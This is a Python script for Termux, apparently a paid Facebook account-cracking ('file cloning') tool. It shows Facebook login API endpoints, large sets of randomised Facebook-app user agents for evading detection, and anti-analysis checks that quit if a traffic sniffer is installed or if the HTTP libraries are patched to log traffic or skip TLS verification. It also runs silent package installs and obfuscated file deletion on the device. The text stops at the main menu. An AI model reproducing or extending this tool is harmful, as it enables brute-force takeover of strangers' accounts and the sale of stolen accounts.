#This script is written by Ali khan 03074816643
#════════════════❮IMPORTANT DATA ❯═══════════════════#
import os,sys,string,random,subprocess,platform,uuid,zlib,base64,time,json,re,hashlib,datetime
try:
    import bs4
except ModuleNotFoundError:
    os.system('pip install bs4 --quiet 2>/dev/null')
except:pass
try:
    import httplib2
except ModuleNotFoundError:
    os.system('pip install httplib2 --quiet 2>/dev/null')
except:pass
try:
    import arrow
except ModuleNotFoundError:
    os.system('pip install arrow --quiet 2>/dev/null')
except:pass
try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests --quiet 2>/dev/null")
except:pass
try:
    import pycurl
except ModuleNotFoundError:
    os.system("pip install pycurl --quiet 2>/dev/null")
except:pass
try:
    import futures
except ModuleNotFoundError:
    os.system("pip install futures --quiet 2>/dev/null")
except:pass
try:import httplib2
except ModuleNotFoundError:
    try:
        with open(os.devnull, 'w') as null:
            subprocess.check_call(["pip", "install", " httplib2"], stdout=null, stderr=null)
            import httplib2
    except subprocess.CalledProcessError:
        print(f"\033[1;97m [\033[1;92m•\033[1;97m]\033[1;97m Module Installing Failed")
        exit()
from uuid import uuid4
from time import sleep as sp
from bs4 import BeautifulSoup as pars
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor as tpe
#════════════════❮COLOR Set-up❯═══════════════════#
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
PURPLE ='\x1b[38;5;46m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
EXTRA ='\x1b[38;5;208m'
#════════════════❮Missing Modules❯═══════════════════#
print('\x1b[1;92m [√] MR BALOCH XD:)🔥️')
os.system("clear")
print(f"\033[92;1m [\033[97;1m•\033[92;1m]\033[97;1m Installing Missing Modules...!!")
time.sleep(2)
os.system("clear")
os.system("pip uninstall httpx -y")
os.system("pip install httpx")
os.system("pip uninstall httpx requests -y")
os.system("pip install requests httpx")
#════════════════❮SECURITY CODE❯═══════════════════#
try:
    os.system('rm -'+'rf /sd'+'card/.txt');os.system('clear');open('/sd'+'ca'+'rd/.t'+'xt','w').write(' ')
except PermissionError:
    os.system("clear")
    print(f"\033[97;1m [\033[92;1m•\033[97;1m] Ple"+"ase Allo"+"w Sto"+"rage P"+"ermi"+"ssio"+"n Fo"+"r Sa"+"ve Fi"+"le Th"+"en R"+"un A"+"gain");os.system('termux-setup-storage');os.system('clear');exit(f"\033[97;1m [\033[92;1m•\033[97;1m] Ru"+"n Aga"+"in Thi"+"s To"+"ol !!")
try:
    fileee = os.listdir("/sd"+"card/"+"Andr"+"oid/"+"data/")
    if f'com'+'.httpc'+'an'+'ary'+'.pro' in fileee:
        print('Ple'+'ase un'+'inst'+'all htt'+'p cana'+'ry fr'+'om y'+'our d'+'evice');exit()
except:pass
style = f"\033[97;1m [\033[92;1m•\033[97;1m]"
site = '/da'+'ta/data/com.termu'+'x/files/usr/lib/python3.11/s'+'ite-packages/'
warning = "Do Not Try Bypass & Capture ...!"
pipo = 'p'+'ip unin'+'stall requ'+'ests cha'+'rdet ur'+'lli'+'b3 id'+'na cer'+'tifi -'+'y;pi'+'p ins'+'tall cha'+'rdet urll'+'ib3 idn'+'a cer'+'tifi re'+'ques'+'ts'
try:
    king=f'{site}reque'+'sts/'
    if not 'print' in open(king+'sess'+'ions.py','r').read():pass
    else:exit(f"{style} {warning}")
except:exit(f'{style} Ple'+'ase Ty'+f'pe : {pipo} ')
try:
    qeen=f'{site}reque'+'sts/'
    if not 'print' in open(qeen+'mod'+'els.py','r').read():pass
    else:exit(f"{style} {warning} ")
except:exit(f'{style} Ple'+'ase Ty'+f'pe : {pipo} ')
try:
    don=f'{site}reque'+'sts/'
    if not 'print' in open(don+'ap'+'i.py','r').read():pass
    else:exit(f"{style} {warning}")
except:exit(f'{style} Ple'+'ase Ty'+f'pe : {pipo} ')
try:
    king=f'{site}reque'+'sts/'
    if not 'sys.stdout.write' in open(king+'sess'+'ions.py','r').read():pass
    else:exit(f"{style} {warning}")
except:exit(f'{style} Ple'+'ase Ty'+f'pe : {pipo} ')
try:
    qeen=f'{site}req'+'uests/'
    if not 'sys.stdout.write' in open(qeen+'mod'+'els.py','r').read():pass
    else:exit(f"{style} {warning}")
except:exit(f'{style} Ple'+'ase Ty'+f'pe : {pipo} ')
try:
    don=f'{site}requ'+'ests/'
    if not 'sys.stdout.write' in open(don+'a'+'pi.py','r').read():pass
    else:exit(f"{style} {warning}")
except:exit(f'{style} Ple'+'ase Ty'+f'pe : {pipo} ')
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('pip install requests');exit(f"{style} {warning}")
try:
    a=open('requests/sessions.py','r').read()
    if 'print' in a:exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('requests/api.py','r').read()
    if 'print' in a:exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('requests/models.py','r').read()
    if 'print' in a:exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('httpx/_api.py','r').read()
    if 'print' in a:exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('httpx/_auth.py','r').read()
    if 'print' in a:exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('httpx/_models.py','r').read()
    if 'print' in a:exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('requests/sessions.py','r').read()
    if 'sys.stdout.write' in a:exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('requests/api.py','r').read()
    if 'sys.stdout.write' in a:exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('requests/models.py','r').read()
    if 'sys.stdout.write' in a:exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('httpx/_api.py','r').read()
    if 'sys.stdout.write' in a:exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('httpx/_auth.py','r').read()
    if 'sys.stdout.write' in a:exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('httpx/_models.py','r').read()
    if 'sys.stdout.write' in a:exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('requests/sessions.py', 'r').read()
    if "verify = False" in a:exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open('requests/sessions.py', 'r').read()
    if "self.verify = False" in a:exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
try:
    a=open(f'urllib3/conne'+'ction.py', 'r').read()
    if str("cert_reqs = 'CERT_NONE'") in a:exit(f"{style} {warning}")
    else:pass
except Exception as e:pass
def checking():
    with open(f'{site}requests/sessions.py', 'r') as file :
        filedata63 = file.read()
    if "verify = False" in filedata63:exit(f"{style} {warning}")
    else:pass
    with open(f'{site}requests/sessions.py', 'r') as file :
        filedata63 = file.read()
    if "self.verify = False" in filedata63:exit(f"{style} {warning}")
    else:pass
    with open(f'{site}urllib3/conne'+'ction.py', 'r') as file7i7 :
        filedata47 = file7i7.read()
    if str("cert_reqs = 'CERT_NONE'") in filedata47:exit(f"{style} {warning}")
def verify():
    with open(f'{site}req'+'uests/sessi'+'ons.py', 'r') as file :
            filedata = file.read()
    filedata = filedata.replace('verify = False', 'verify = True')
    with open(f'{site}reque'+'sts/sessi'+'ons.py', 'w') as file:
        file.write(filedata)
    if "verify = True" in filedata:pass
    else:
        with open(f'{site}requ'+'ests/sess'+'ions.py', 'a') as file:
            file.write('\nverify = True\n')
    pass
def issue():
    if os.path.isfile("/data/d"+"ata/com.ter"+"mux/files/u"+"sr/bin/rm"):pass
    else:system('clear');print(f'{style} Syste'+'m Modif'+'ication N'+'ot Allo'+'wed Warn'+'ing By BALOCH');exit()
    if os.path.isfile("/data/da"+"ta/com.termu"+"x/files/usr"+"/bin/cp"):pass
    else:system('clear');print(f'{style} Syst'+'em Mod'+'ification N'+'ot Allo'+'wed War'+'ning By BALOCH');exit()
    if os.path.isfile("/data/da"+"ta/com.termu"+"x/files/us"+"r/bin/mv"):pass
    else:system('clear');print(f'{style} Sys'+'tem Modifi'+'cation N'+'ot All'+'owed Warni'+'ng By BALOCH');exit()
    if os.path.isfile("/data/d"+"ata/com.termu"+"x/files/usr/bi"+"n/termux-reset"):pass
    else:system('clear');print(f'{style} Sys'+'tem Modi'+'fication N'+'ot All'+'owed War'+'ning By BALOCH');exit()
    if os.path.isfile("/data/dat"+"a/com.termux/files/usr/"+"bin/term"+"ux-setup-storage"):pass
    else:system('clear');print(f'{style} Sy'+'stem Modi'+'fication N'+'ot Allo'+'wed War'+'ning By BALOCH');exit()
    if os.path.isfile("/data/da"+"ta/com.termu"+"x/files/usr/"+"bin/pip"):pass
    else:system('clear');print(f'{style} Sy'+'stem Modi'+'fication N'+'ot Allo'+'wed War'+'ning By BALOCH');exit()
    if os.path.isfile("/data/dat"+"a/com.termux/file"+"s/usr/bin"+"/pip3"):pass
    else:system('clear');print(f'{style} Sy'+'stem Modi'+'fication N'+'ot Allo'+'wed Wa'+'rning By BALOCH');exit()
    if os.path.isfile("/data/data/com"+".termux/files/"+"usr/bin/"+"pip3.11"):pass
    else:system('clear');print(f'{style} Sys'+'tem Modific'+'ation N'+'ot Allo'+'wed War'+'ning By BALOCH');exit()
#════════════════❮PROTECTOR❯═══════════════════#
from os import path,system
if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
    pass
else:
    print(f"\033[97;1m [\033[92;1m•\033[97;1m] Bro Turn Off Protecter...! Then Run Tool");exit()
#════════════════❮TIME DATE❯═══════════════════#
import time
from datetime import date
from datetime import datetime
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#════════════════❮LOOP❯═══════════════════#
hashes = []
pwx=[]
id = []
user=[]
ok = []
lok=[]
twf=[]
cp = []
loop = 0
method=[]
twf=[]
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()
#════════════════❮DEF LINE❯═══════════════════#
def line():
    print(49*'=')
def p(x):
    print(x)
#════════════════❮User agent 01❯═══════════════════#
def baloch1():
    END = "[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281745;FBDM/{density=2.0,width=720,height=1280};FBLC/it_IT;FBRV/0;FBCR/I TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J710F;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    return "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))+";FBBV/"+str(random.randint(1111111,7777777))+";"+END
#════════════════❮User agent 02❯═══════════════════#
def baloch4():
    model = "iPhone"+str(random.randint(4,16))+','+str(random.randint(1,9))
    abc = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','X','Y','Z']
    build = str(random.randint(9,19))+random.choice(abc)+str(random.randint(50,199))
    fbsv = str(random.randint(4,16))+'_'+str(random.randint(1,9))+'_'+str(random.randint(1,9))
    ua1 = 'Mozilla/5.0 (iPhone, CPU iPhone '+fbsv+' like Mac OS '+str(random.randint(8,16))+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+build+') Safari/604.1'
    ua2 = "Mozilla/5.0 (iPhone "+str(random.randrange(4,6))+" X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/"+str(random.randint(4,13))+".1.1 Mobile/"+model+" Safari/604.1"
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    ua3 = f"Mozilla/5.0 (Linux; Android {str(random.randint(4,13))}; "+dv_typ+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020'])
    bl_typ = random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua4 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    bl_typ = random.choice(['PPR1','LRX21T','TP1A','RKQ1','SP1A','RP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua5 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['vivo 1951','vivo 1918','V2011A','V2047','V2145','V2227A','V2160'])
    bl_typ = random.choice(['RP1A','PKQ1','QP1A','TP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua6 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    fbav = str(random.randint(99,450))+'.0.0.'+str(random.randrange(11,99))+"."+str(random.randint(11,333))
    END= f"[FBAN/EMA;FBLC/en_US;FBAV/{fbav};]"
    ua = random.choice([ua1,ua2,ua3,ua4,ua5,ua6])+END
    return(ua)
#════════════════❮User agent 03❯═══════════════════#
def baloch3():
    Lenovo = "[FBAN/FB4A;FBAV/159.0.0.38.95;FBBV/91889140;FBDM/"+"{density=1.0,width=1280,height=752}"+";FBLC/pt_PT;FBRV/92233038;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TB-X103F;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    Nokia = "[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/"+"{density=2.0,width=720,height=1280}"+";FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1020;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    Lge = "[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/"+"{density=2.0,width=720,height=1187}"+";FBLC/pt_PT;FBRV/85070460;FBCR/MEO;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-K350;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    Realme = "[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237439;FBDM/"+"{density=1.7,width=720,height=1469}"+";FBLC/hi_IN;FBRV/0;FBCR/Jio 4G;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1911;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    Xiaomi = "[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235290;FBDM/"+"{density=2.75,width=1080,height=2131}"+";FBLC/en_US;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7S;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    Oppo = "[FBAN/FB4A;FBAV/281.0.0.36.124;FBBV/234741951;FBDM/"+"{density=2.0,width=720,height=1424}"+";FBLC/en_US;FBRV/236603060;FBCR/TM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1853;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    Vivo = "[FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=1920}"+";FB_FW/1;]"
    Huawei = "[FBAN/FB4A;FBAV/258.0.0.34.119;FBBV/199294743;FBDM/"+"{density=3.0,width=1080,height=2107}"+";FBLC/en_GB;FBRV/200600534;FBCR/3;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    Infinix = "[FBAN/FB4A;FBAV/399.0.0.24.93;FBBV/440587317;FBDM/"+"{density=2.0,width=720,height=1440}"+";FBLC/id_Qaau_ID;FBRV/444131581;FBCR/XL Axiata;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X653C;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    Tecno = "[FBAN/Orca-Android;FBAV/377.0.0.13.101;FBPN/com.facebook.orca;FBLC/en_US;FBBV/396116327;FBCR/LoneStar;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO KI5k;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.0,width=720,height=1444}"+";FB_FW/1;]"
    Sony = "[FBAN/FB4A;FBAV/445.0.0.34.118;FBBV/548452773;FBDM/"+"{density=2.8125,width=1080,height=2385}"+";FBLC/de_DE;FBRV/552864739;FBCR/Swisscom;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/XQ-DC54;FBSV/14;FBOP/19;FBCA/arm64-v8a:;]"
    Htc = "[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723422;FBDM/"+"{density=2.0,width=720,height=1184}"+";FBLC/hr_HR;FBCR/m:tel;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 816;FBSV/6.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    OnePlus = "[FBAN/FB4A;FBAV/283.0.0.31.121;FBBV/237966664;FBDM/"+"{density=2.625,width=1080,height=1920}"+";FBLC/en_US;FBRV/239808926;FBCR/Vodafone IN;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONEPLUS A5000;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    Motorola = "[FBAN/FB4A;FBAV/288.1.0.47.123;FBBV/245303580;FBDM/"+"{density=2.0,width=720,height=1371}"+";FBLC/pt_BR;FBRV/246374287;FBCR/TIM;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(7) power;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    Google = "[FBAN/FB4A;FBAV/302.0.0.45.119;FBBV/268946177;FBDM/"+"{density=2.75,width=1080,height=2160}"+";FBLC/en_GB;FBRV/0;FBCR/EE;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 5;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
    IPhone = "[FBAN/FBIOS;FBAV/299.0.0.49.224;FBBV/261226539;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/14.4.2;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBRV/262902978]"
    END = random.choice([Lenovo,Nokia,Lge,Realme,Xiaomi,Oppo,Vivo,Huawei,Infinix,Tecno,Sony,Htc,OnePlus,Motorola,Google])
    Dalvik = random.choice(["Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; Z987 Build/KTU84P)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; MI 5X MIUI/V10.3.1.0.ODBCNXM)"])
    ua = Dalvik+"[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))+";FBBV/"+str(random.randint(1111111,7777777))+";"+END
    return ua
#════════════════❮User agent 04❯═══════════════════#
def baloch2():
    Lenovo = "[FBAN/FB4A;FBAV/159.0.0.38.95;FBBV/91889140;FBDM/"+"{density=1.0,width=1280,height=752}"+";FBLC/pt_PT;FBRV/92233038;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TB-X103F;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    Nokia = "[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/"+"{density=2.0,width=720,height=1280}"+";FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1020;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    Lge = "[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/"+"{density=2.0,width=720,height=1187}"+";FBLC/pt_PT;FBRV/85070460;FBCR/MEO;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-K350;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    Realme = "[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237439;FBDM/"+"{density=1.7,width=720,height=1469}"+";FBLC/hi_IN;FBRV/0;FBCR/Jio 4G;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1911;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    Xiaomi = "[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235290;FBDM/"+"{density=2.75,width=1080,height=2131}"+";FBLC/en_US;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7S;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    Oppo = "[FBAN/FB4A;FBAV/281.0.0.36.124;FBBV/234741951;FBDM/"+"{density=2.0,width=720,height=1424}"+";FBLC/en_US;FBRV/236603060;FBCR/TM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1853;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    Vivo = "[FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=1920}"+";FB_FW/1;]"
    Huawei = "[FBAN/FB4A;FBAV/258.0.0.34.119;FBBV/199294743;FBDM/"+"{density=3.0,width=1080,height=2107}"+";FBLC/en_GB;FBRV/200600534;FBCR/3;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    Infinix = "[FBAN/FB4A;FBAV/399.0.0.24.93;FBBV/440587317;FBDM/"+"{density=2.0,width=720,height=1440}"+";FBLC/id_Qaau_ID;FBRV/444131581;FBCR/XL Axiata;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X653C;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    Tecno = "[FBAN/Orca-Android;FBAV/377.0.0.13.101;FBPN/com.facebook.orca;FBLC/en_US;FBBV/396116327;FBCR/LoneStar;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO KI5k;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.0,width=720,height=1444}"+";FB_FW/1;]"
    Sony = "[FBAN/FB4A;FBAV/445.0.0.34.118;FBBV/548452773;FBDM/"+"{density=2.8125,width=1080,height=2385}"+";FBLC/de_DE;FBRV/552864739;FBCR/Swisscom;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/XQ-DC54;FBSV/14;FBOP/19;FBCA/arm64-v8a:;]"
    Htc = "[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723422;FBDM/"+"{density=2.0,width=720,height=1184}"+";FBLC/hr_HR;FBCR/m:tel;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 816;FBSV/6.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    OnePlus = "[FBAN/FB4A;FBAV/283.0.0.31.121;FBBV/237966664;FBDM/"+"{density=2.625,width=1080,height=1920}"+";FBLC/en_US;FBRV/239808926;FBCR/Vodafone IN;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONEPLUS A5000;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    Motorola = "[FBAN/FB4A;FBAV/288.1.0.47.123;FBBV/245303580;FBDM/"+"{density=2.0,width=720,height=1371}"+";FBLC/pt_BR;FBRV/246374287;FBCR/TIM;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(7) power;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    Google = "[FBAN/FB4A;FBAV/302.0.0.45.119;FBBV/268946177;FBDM/"+"{density=2.75,width=1080,height=2160}"+";FBLC/en_GB;FBRV/0;FBCR/EE;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 5;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
    IPhone = "[FBAN/FBIOS;FBAV/299.0.0.49.224;FBBV/261226539;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/14.4.2;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBRV/262902978]"
    END = random.choice([Lenovo,Nokia,Lge,Realme,Xiaomi,Oppo,Vivo,Huawei,Infinix,Tecno,Sony,Htc,OnePlus,Motorola,Google])
    ua = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))+";FBBV/"+str(random.randint(1111111,7777777))+";"+END
    return ua
#════════════════❮DEF LOGO ❯═══════════════════#
def logo():
    sys.stdout.write('\x1b]2; 𝘽𝘼𝙇𝙊𝘾𝙃 \x07')
    os.system('clear')
    logo = (f'''\033[1;37m                                 
 \033[1;37m[8888b.  .d8b.  db       .d88b.   .o88b. db   db 
 \033[1;37m88  `8D d8' `8b 88      .8P  Y8. d8P  Y8 88   88 
 \033[1;35m88oooY' 88ooo88 88      88    88 8P      88ooo88 
 \033[1;36m88~~~b. 88~~~88 88      88    88 8b      88~~~88 
 \033[1;37m88   8D 88   88 88booo. `8b  d8' Y8b  d8 88   88 
 \033[1;37mY8888P' YP   YP Y88888P  `Y88P'   `Y88P' YP   YP
\033[1;37m ================================================
    🥰😍️\033[92;1mMoqadar k sekandr kbi joooka ni krty❤💕
\033[1;37m ================================================
 \033[1;97m[\033[1;92m•\033[1;97m] Owner    : BALOCH XD [\033[1;92mALI HASSAN\033[1;97m]
 \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : BALOCH-14
 \033[1;97m[\033[1;92m•\033[1;97m] Status   : PAID 
 \033[1;97m[\033[1;92m•\033[1;97m] Version  : \033[1;92m20.0
\033[1;37m ================================================''')
#════════════════❮DEF CLEAR ❯═══════════════════#
    p(logo)
def clear():
    os.system("clear")
    logo()
#════════════════❮CLASS MAIN❯═══════════════════#
class iAmMain:
    def __init__(self):
        self.gp = "https://b-graph.facebook.com/auth/login"
        self.ap = "https://b-api.facebook.com/auth/login"
#════════════════❮MAIN MANU❯═══════════════════#
    def iAmMenu(self,name,join,user,exp,left):
        clear()
        print(f"\033[1;97m [\033[1;92m•\033[1;97m] \033[1;97mYour Name : \033[1;92m"+name)
        print(f"\033[1;97m [\033[1;92m•\033[1;97m] \033[1;97mYour Key  : \033[1;92m"+user)
        print(f'\033[1;97m [\033[1;92m•\033[1;97m] \033[1;97mYour Join Date   : \033[1;92m'+join)
        print(f"\033[1;97m [\033[1;92m•\033[1;97m] \033[1;97mYour Expiry Date : \033[1;91m{exp}")
        print(f"\033[1;97m [\033[1;92m•\033[1;97m] \033[1;97mKey Expire After : \033[1;91m{left.days}\033[1;97m Days")
        line()
        p(" [\033[92;1m1\033[1;37m] File Cloning ")
        p(" [\033[92;1m2\033[1;37m] Create File ")
        p(" [\033[92;1m3\033[1;37m] Cut Used Files Lines ")
        p(" [\033[92;1m4\033[1;37m] Contact With Owner[\033[1;92mALI HASSAN\033[1;97m]🤞")
        p(" [\033[92;1m5\033[1;37m] Contact With Ids Buyer by BALOCH🤙")
